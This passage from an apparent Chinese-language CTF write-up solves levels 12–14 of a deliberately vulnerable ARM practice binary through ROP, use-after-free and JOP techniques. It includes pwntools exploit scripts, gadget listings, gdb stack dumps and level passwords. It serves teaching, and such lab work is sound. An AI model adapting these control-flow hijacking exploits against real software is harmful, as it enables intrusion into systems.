Please enter your magic stuff:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa
Flag: 00001234, You entered: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa
QEMU: Terminated via GDBstub
```
![6.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdqz5lxiezhwpmc9.png)
用cyclic -l 0x61616170得到偏移量为60
接下来就是构建ROP链的过程，在构建之前，先讲一下原理。
这个方法的原理与arm汇编指令pop的特性有关。
在 ARM 汇编中，pop 指令用于从栈中弹出值并将其加载到寄存器中。具体来说，它会执行以下操作：
pop 指令的基本形式：
`pop {registers}`
其中，registers 是要从栈中弹出的寄存器列表。例如：

`pop {r0, r1, r2}`
这条指令会从栈中依次弹出值，并将它们加载到寄存器 r0、r1 和 r2 中。

栈的操作过程：
* 1.栈指针（SP）移动：

* ARM 使用栈指针 (sp) 来跟踪栈的当前顶端。
* 每次执行 pop 操作时，栈指针都会调整，指向新的栈顶位置。
* 例如，如果栈中有 4 字节的值要弹出，栈指针会增加 4 字节。
* 栈是向下生长的，即从高地址向低地址方向增长。因此，每次 pop 后，栈指针会增加相应的字节数。
* 2.寄存器加载：

* pop 操作会将栈中的值加载到指定的寄存器中。例如，执行 pop {r0, r1} 时，栈中的两个值会依次加载到 r0 和 r1 中。
举例说明：
假设栈中的内容如下，栈从高地址到低地址生长：

| 地址       | 数据    |
|------------|---------|
| 0x1000     | 0x1234  |
| 0x0ffc     | 0x5678  |
| 0x0ff8     | 0x9abc  |

如果执行 `pop {r0, r1}`，则：
1. `r0` 会加载 `0x1234`（栈顶的值），栈指针增加 4 字节，指向 `0x0ffc`。
2. `r1` 会加载 `0x5678`（新的栈顶值），栈指针再次增加 4 字节，指向 `0x0ff8`。
   
最终，栈的状态变成：
| 地址       | 数据    |
|------------|---------|
| 0x0ff8     | 0x9abc  |

并且寄存器 `r0` 和 `r1` 的值分别是 `0x1234` 和 `0x5678`。
简单来说就是pop指令会从栈中读取然后改变寄存器的值，如果pop {pc}，还会直接修改PC寄存器的值，从而实现跳转
我们看一下comp()函数的判断部分
if ( a1 == 22136 )
这里看伪代码没法知道所有的信息，查看对应的汇编指令
```
PUSH    {R11,LR}
ADD     R11, SP, #4
SUB     SP, SP, #8
STR     R0, [R11,#var_8]
LDR     R3, [R11,#var_8]
LDR     R2, =0x5678
CMP     R3, R2
BNE     loc_10420
```
这里的if语句转换成汇编，就是先给R2寄存器赋值（0x5678)，然后把r3与r2比较，如果不相等就跳过打印密码的程序段，如果相等就执行。
所以我们构建ROP链的目标就是找到一段 pop{r0,r1,r2,r3,pc}的指令段，然后在后面加上r0,r1,r2,r3,pc的值，这样就能控制这几个寄存器，再通过修改pc，跳转到执行comp()函数的地方执行comp()，这时comp()里面的输入值就能够用我们构建的ROP链来控制，从而达到题目控制flag的目的
这里我们使用ROPgadget工具，在exploit程序中找我们需要的pop指令
ROPgadget是一款可以在二进制文件中搜索Gadget的强大工具，本质上来说，ROPgadget 是一个小工具查找程序和自动操作程序。在该工具的帮助下，广大研究人员可以在二进制文件中搜索Gadget，以方便我们实现对 ROP 的利用。ROPgadget 支持 x86，x64，ARM，PowerPC，SPARC 和 MIPS 体系结构，并支持 ELF / PE / Mach-O 格式。

 ROPgadget工具的安装
$ sudo apt install python3-pip
$ sudo -H python3 -m pip install ROPgadget
$ ROPgadget --help

ROPgadget的用法
$ROPgadget --binary <file name> --only <string>
或者
$ROPgadget --binary <file name> | grep <string>
这里我们使用
```bash
ROPgadget --binary exploit --only pop
Gadgets information
============================================================
0x0001042c : pop {fp, pc}
0x0007d29c : pop {r0, pc}
0x000103b4 : pop {r0, r1, r2, r3, pc}
0x000398c4 : pop {r0, r4, pc}
0x0007d9a0 : pop {r1, pc}
0x00010160 : pop {r3, pc}
0x00017af4 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x00010d20 : pop {r4, fp, pc}
0x0001034c : pop {r4, pc}
0x00010a90 : pop {r4, r5, fp, pc}
0x0001f910 : pop {r4, r5, pc}
0x000101f4 : pop {r4, r5, r6, pc}
0x0001479c : pop {r4, r5, r6, pc} ; pop {r4, r5, r6, pc}
0x00011dfc : pop {r4, r5, r6, r7, pc}
0x00011eb8 : pop {r4, r5, r6, r7, r8, pc}
0x0002d0a4 : pop {r4, r5, r6, r7, r8, sb, fp, pc}
0x0001538c : pop {r4, r5, r6, r7, r8, sb, pc}
0x000120ec : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x00014c3c : pop {r4, r5, r6, r7, r8, sb, sl, pc}
0x000751ec : pop {r4, r5, r6, r7, r8, sl, pc}
0x0003b55c : pop {r4, r5, r7, pc}
0x0002e170 : pop {r4, r6, r7, pc}
0x0003a8e0 : pop {r4, r7, pc}
0x0003a7c0 : pop {r7, pc}

Unique gadgets found: 24
```
可以看到在程序的0x000103b4地址处有我们所需要的pop {r0, r1, r2, r3, pc}
从此可以构建一个payload，payload前半部分由64个'a'组成的垃圾数据构成，紧接着是pop r0-r3 pc的命令块的地址，然后在后面拼接上r0,r1,r2,r3,pc的值，这样程序在执行完pop指令后，会跳转到pc的地址，同时此时的r0-r3寄存器就分别都是我们输入的值
进入gdb动态调试
在程序完成scanf位置下断点，然后查看栈空间的情况
```
pwndbg> x/50xw $sp
0xfffeecc8:	0xfffeef24	0x00000002	0x00000000	0x61616161
0xfffeecd8:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffeece8:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffeecf8:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffeed08:	0x61616161	0x61616161	0x61616161	0x000103b4  #这里是pop地址
0xfffeed18:	0x30303030	0x31313131	0x00005678	0x00005678  #r0-r3
0xfffeed28:	0x00010400	0x00000000	0x00000000	0x00000000  #pc
0xfffeed38:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeed48:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeed58:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeed68:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeed78:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeed88:	0x00000000	0x00000000
```
观察到对应位置都写入了对应的值
通过上面的描述写exp
```py
from pwn import *
pop_r0_r3_pc_addr = 0x000103B4
v2 = 0x00005678
comp_addr = 0x000103EC
payload = b'a'*64
payload += p32(pop_r0_r3_pc_addr) #
payload += p32(v2)+p32(v2)   #对应寄存器r0,r1的值
payload += p32(v2)+p32(v2)   #对应寄存器r2,r3的值
payload += p32(comp_addr)    #对应寄存器pc的值

cmd =['qemu-arm','-g','1234','./exploit','ropeme']
p = process(cmd)
p.sendline(payload)
p.interactive()
```
执行脚本，就可以看到第十三关的密码"Magic"
```bash
python3 level12.py 
[+] Starting local process '/usr/bin/qemu-arm': pid 11073
[*] Switching to interactive mode
Please enter your magic stuff:
Flag: 00001234, You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x03\x01

Level 12 Password: "Magic"
[*] Process '/usr/bin/qemu-arm' stopped with exit code 0 (pid 11073)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```

# 0x13 level 13 Use after Free
```
LEVEL 13 - Use after Free
--------
    ./exploit xxx [options]

    Hint: Maybe a destroyed mapping can be reused to our advantage ?
```
UAF漏洞的原理:
    假设有一个程序，申请了一个内存给p1指针，然后释放掉该指针，再次申请一个同样大小的内存,此时程序会将p1申请的内存地址给p2，如果这时修改*p2的值，*p1的值同样会被修改。
    此时访问p2也能访问到P1 的值
Linux内核在堆上分配内存时，通常会使用如下系统调用

malloc(分配小块内存时调用)
brk：将数据段(.data)的最高地址指针_edata往高地址推（从堆头开始，参数为地址）
sbrk：将地址指针往高地址推（从当前指针位置开始，参数为指针增量）
mmap(默认分配大于128k内存时调用)
由于频繁的分配释放内存容易产生碎片，并且会影响性能，因此Linux引入了基于内存池的内存管理方式，堆内存的分配和回收进行统一管理，对于每一块内存称之为chunk

被用户free掉的chunk，通过指针连接成链表，不同大小的内存连接成不同的链表，每一个链表称之为bin，当再次需要分配某一个大小的内存时，就在对应大小的chunk连接成的bin中分配即可，进而减少碎片，也可以提高内存分配效率

因此当我们在堆上分配相同大小内存时，被free的内存被接入bin中，再次分配相同大小的内存就会从bin上分配，进而极大增加了分配到的内存地址相同的概率；这也就解释了为什么在UAF利用中，两次分配的内存地址会一样
具体到程序里面，先输入./exploit Magic拿到Usage
```
usage: ./exploit Magic <options> <cmd>
loopable options are "0"=new mapped device, "1"=destroy mapped device, "2"=run device command,  "3"=setup device command
```
0创建映射指针，1释放指针，2运行cmd，3设置cmd
并且提示可以循环使用，也就是输入0132时程序会依次执行0132
进IDA查看伪代码：
```c
int __fastcall use_after_free(char *a1)
{
  int v1; // r0
  char v4[512]; // [sp+8h] [bp-214h] BYREF
  int v5; // [sp+208h] [bp-14h]
  int v6; // [sp+20Ch] [bp-10h]
  char *v7; // [sp+210h] [bp-Ch]
  int i; // [sp+214h] [bp-8h]

  puts("Please enter command:");
  memset(v4, 0, sizeof(v4));
  fgets(v4, 512, stdin);
  v7 = a1;
  v6 = 0;
  i = 0;
  v5 = strlen(a1);
  for ( i = v5; i > 0; --i )
  {
    v6 = (unsigned __int8)v7[v5 - i] - 48;
    v1 = printf("\nFlag : %d\n", v6);
    if ( v6 )
    {
      switch ( v6 )
      {
        case 1:
          destroymapping();
          break;
        case 2:
          if ( mappingptr )
            (*(void (__fastcall **)(int))(mappingptr + 64))(v1);
          break;
        case 3:
          fillmapping(v4);
          break;
        default:
          puts("\nInvalid flag.");
          break;
      }
    }
    else
    {
      puts("Creating new mapping.");
      new_mapping();
    }
  }
  return 0;
}
int new_mapping(void)
{
  char v1[16]; // [sp+4h] [bp-10h] BYREF

  strcpy(v1, "mymapping");
  mappingptr = malloc(512);
  strncpy(mappingptr, v1, 64);
  *(_DWORD *)(mappingptr + 64) = run;
  *(_DWORD *)(mappingptr + 68) = destroy;
  return puts("Mapping created.");
}
_BYTE *__fastcall fillmapping(char *a1)
{
  _BYTE *result; // r0
  _BYTE *v3; // [sp+Ch] [bp-8h]

  v3 = (_BYTE *)malloc(512);
  memcpy(v3, (unsigned int)a1, 256, (int)v3);
  printf("Command buffer set as %s\n", v3);
  result = runcmd;
  memcpy(runcmd, (unsigned int)v3, 512, 512);
  return result;
}
int run(void)
{
  return system(runcmd);
}
int destroy(void)
{
  return puts("Mapping destroyed.");
}
int destroymapping(void)
{
  if ( mappingptr )
    (*(void (**)(void))(mappingptr + 68))();
  return free(mappingptr);
}
```
以上代码简化一下就是根据用户输入的数字依次执行指令，
运行时，先请求用户输入fgets()，输入值存入v4。
其中flag = 0时，会创建一个指针，同时为其动态申请一个512长度的内存空间，并且指针+64的位置对应他的元素run，可以执行系统命令，指针+68的位置对应他的对象destroy，会打印Mapping destroyed
flag = 1时，运行destroymapping()函数，运行这个指针指向的对象的destroy方法，然后用free释放掉这个指针。
flag = 2时，判断指针是否存在，若存在就调用这个指针指向的run函数，执行系统命令
flag = 3时，调用fillmapping(v4)，该函数会创建一个指针v3，同时也会分配512长度的内存地址，与flag = 0 不同的是，这次并没有给它创建run和destroy对象，然后将v4拷贝给runcmd，这是一个长度为512的字符串数组
在run()方法里面会执行system(runcmd)

这里的漏洞点就是fillmapping里面的strcpy
填充字符串到这个指针的+64地址，在执行flag = 2的时候， 程序就会跳转到覆盖的地址，由于此时mapping被释放，访问它的对象run，也就是这条语句`(*(void (__fastcall **)(int))(mappingptr + 64))(v1);`，这句话相当于将程序跳转到v3指针+64的位置指向的内存地址的内容，程序就会跳转到该位置，只要确保payload里面这个位置是打印level13password函数的地址，就能实现跳转并打印第十三关的密码。

根据这个思路我们就可以开始构建payload，并且写出利用脚本。
```py
from pwn import *

lv13passwd_addr = 0x10570
payload =b'A'*64 + p32(lv13passwd_addr)
cmd = ['./exploit','Magic','0132']

p1 = process(cmd)
p1.sendline(payload)
p1.interactive()
```
执行脚本得到结果
```bash
python3 level13.py 
[+] Starting local process './exploit': pid 13860
[*] Switching to interactive mode
Please enter command:

Flag : 0
Creating new mapping.
Mapping created.

Flag : 1
Mapping destroyed.

Flag : 3
Command buffer set as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp\x05\x01

Flag : 2

Well done. Level 13 Password: Jumper
```
程序成功打印level 14的密码Jumper。

# 0x14 level 14 Jump Oriented Programming (JOP)
```
LEVEL 14 - Jump Oriented Programming (JOP)
--------
    ./exploit xxx token.bin

    Hint: Craft a token.bin that will how you to do your stuff. First integer is total length (little endian), it should bypass the compare at 0x11588 (32bit) / 0x400878 (64bit)
```

什么是jop?
jop，全称Jump-Oriented Programming，中文译为面向跳转编程，是代码重用攻击方式的一种。在2011年，北卡罗来纳州立大学的Tyler Bletsch等人首次提出这一概念。其实际上是在代码空间中寻找被称为gadget的一连串目标指令，且其以jmp结尾。

IDA分析jop()函数的伪代码
```c
int __fastcall jop(char *a1)
{
  int v3; // [sp+8h] [bp-34h] BYREF
  char v4[32]; // [sp+Ch] [bp-30h] BYREF
  int v5; // [sp+2Ch] [bp-10h]
  int v6; // [sp+30h] [bp-Ch]
  _DWORD (__fastcall *v7)(int, char *); // [sp+34h] [bp-8h]

  v7 = showflag;
  memset(v4, 0, sizeof(v4));
  v6 = fopen(a1, "r+b");
  v3 = 0;
  if ( !v6 )
  {
    printf("Token file not found.");
    ((void (__fastcall __noreturn *)(_DWORD))exit)(0);
  }
  fread(&v3, 1, 4, v6);
  fread(v4, 1, v3, v6);
  v5 = 0;
  v7(0, v4);
  if ( v5 == 22136 )
  {
    puts("\nLevel 14 passed. Well done !");
    ((void (__fastcall __noreturn *)(_DWORD))exit)(0);
  }
  puts("\nBad password given.");
  return 0;
}
int __fastcall showflag(int a1, char *a2)
{
  return printf("Flag: %08x, You entered: %s\n", a1, a2);
}
```
分析一下这段伪代码，主要功能是打开用户输入的路径对应的文件，fopen返回值传给v6，
然后用两个fread()读取v6文件，第一个文件读取4个字节的数据填入v3，第二个fread()是从上一个fread()读取结束的地方继续读取v3个数据填充到v4，由此可得，v4的数据大小取决于第一次读取的v3的值。
然后把v5置0，调用v7指针跳转到showflag函数
v7指针的定义在最上面，存储的是showflag()函数的首地址
这里观察到v4存在缓冲区溢出的可能，观察v4定义的部分，发现它是一个32位大小的字符串
我们可以在文件里面写入超过32字节大小的数据，覆盖掉它在栈空间的内容，同时观察变量定义的部分，IDA在这里已经给出了它们在栈空间的相对位置：
```c
  int v3; // [sp+8h] [bp-34h] BYREF
  char v4[32]; // [sp+Ch] [bp-30h] BYREF
  int v5; // [sp+2Ch] [bp-10h]
  int v6; // [sp+30h] [bp-Ch]
  _DWORD (__fastcall *v7)(int, char *); // [sp+34h] [bp-8h]
```
让我们列个表格直观地显示他们的相对位置
![7.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdruviib9uv6bs94.png)
由于fread()之后直接对v5进行了置0的操作，所以简单的溢出修改v5的值不可行，所以只能考虑修改v7的值，幸运的是，修改v7的值会直接修改程序跳转的位置，这就可以让我们能够创建JOP链实现修改寄存器的值进行攻击
使用ROPgadget找找整个文件的pop指令和blx指令
ROPgadget --binary exploit --only 'pop|blx'
0x000103d0 : pop {r4, r5, r6} ; pop {r1, r2, r3} ; blx r1
成功在103d0处找到一条pop指令，这条指令不仅修改了r1,r2,r3的值，还跳转到r1,简直就是为了JOP量身定做的
我们只要用这个pop片段的地址覆盖掉v7，程序运行到v7时就会自动跳转到pop指令修改r1,r2,r3寄存器的值，此时把r1修改为程序做if比较的地址0x10514，就能成功打印函数了
pop_addr = 0x000103d0
cmp_addr = 0x00010514
接下来就是进动态调试分析了
这里我们已经提前把payload写入文件token.txt，执行了
`qemu-arm -g 1234 ./exploit Jumper token.txt `
在0x10504位置下断点(fread结束的位置)
![8.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mds4bc4w4bhbbk1q.png)
这里我们已经payload写入v4并且覆盖掉了v7的地址，用x/50xw $sp查看栈空间
```
pwndbg> x/50xw $sp
0xfffeec78:	0x00000000	0xfffef0ff	0x0000002c	0x00010514
0xfffeec88:	0x00005678	0x00005678	0x41414141	0x41414141
0xfffeec98:	0x41414141	0x41414141	0x41414141	0x00000000
0xfffeeca8:	0x41414141	0x000103d0	0xfffeedd4	0x00011c08
0xfffeecb8:	0xfffeef14	0x00000003	0x00000000	0x0006b60c
0xfffeecc8:	0x00000000	0x0000001d	0x000000f0	0x00000007
0xfffeecd8:	0x00000000	0x000000f8	0x000a75e8	0x0000003b
0xfffeece8:	0x000a9d94	0x0000005b	0x0000001f	0x00000108
0xfffeecf8:	0x0000006e	0x00000028	0x00000003	0x0000001f
0xfffeed08:	0x00000000	0x000000ef	0x00000000	0x000009df
0xfffeed18:	0x00004f00	0x00000007	0x00000000	0x00000000
0xfffeed28:	0x000a75e8	0x00000174	0x000ac49c	0x00000082
0xfffeed38:	0x00000072	0x00004f18
pwndbg> 
```
可以看到这里栈空间分布情况和我们上面的表格一样，v7(sp+0x34)的位置已经被覆盖成0x000103d
按n单步执行
![9.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdsdama3w7slugof.png)
这一步就会跳转到我们的JOPgadget
首先执行了pop {r4,r5,r6}，这一步将r4,r5,r6分别修改为sp,sp+4,sp+8位置上的值，然后把sp指针+12,（add  sp 12)
执行前后栈空间排布对比：
```
执行POP {r4,r5,r6}前
pwndbg> x/50xw $sp
0xfffeec78:	0x00000000	0xfffef0ff	0x0000002c	0x00010514
0xfffeec88:	0x00005678	0x00005678	0x41414141	0x41414141
0xfffeec98:	0x41414141	0x41414141	0x41414141	0x00000000
0xfffeeca8:	0x41414141	0x000103d0	0xfffeedd4	0x00011c08

执行POP {r4,r5,r6}后
pwndbg> x/50xw $sp
0xfffeec84:	0x00010514	0x00005678	0x00005678	0x41414141
0xfffeec94:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffeeca4:	0x00000000	0x41414141	0x000103d0	0xfffeedd4
0xfffeecb4:	0x00011c08	0xfffeef14	0x00000003	0x00000000
```
紧接着执行了pop {r1,r2,r3}
这里就将0x00010514写入r1,0x0005678写入r2，0x0005678写入r3
下一步执行了blx r1
![10.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdsk6gdxm7nmywd4.png)
跳转到cmp r3,r2那里，同时带着修改过的r2,r3寄存器
继续运行，程序就会向控制台打印最终的密码
```bash
 qemu-arm -g 1234  ./exploit Jumper token.txt 

Level 14 passed. Well done !
``` 
以下是编写的EXP脚本，将payload以十六进制小端字节序的方式写入文件token.txt
```py
from struct import pack
pop_addr = 0x000103d0
cmp_addr = 0x00010514
fr=open('token.txt','wb')
data=pack('<III',cmp_addr,0x5678,0x5678)+28*b'A'+pack('<I',pop_addr)
fr.write(pack('<I',len(data)))
fr.write(data)
```
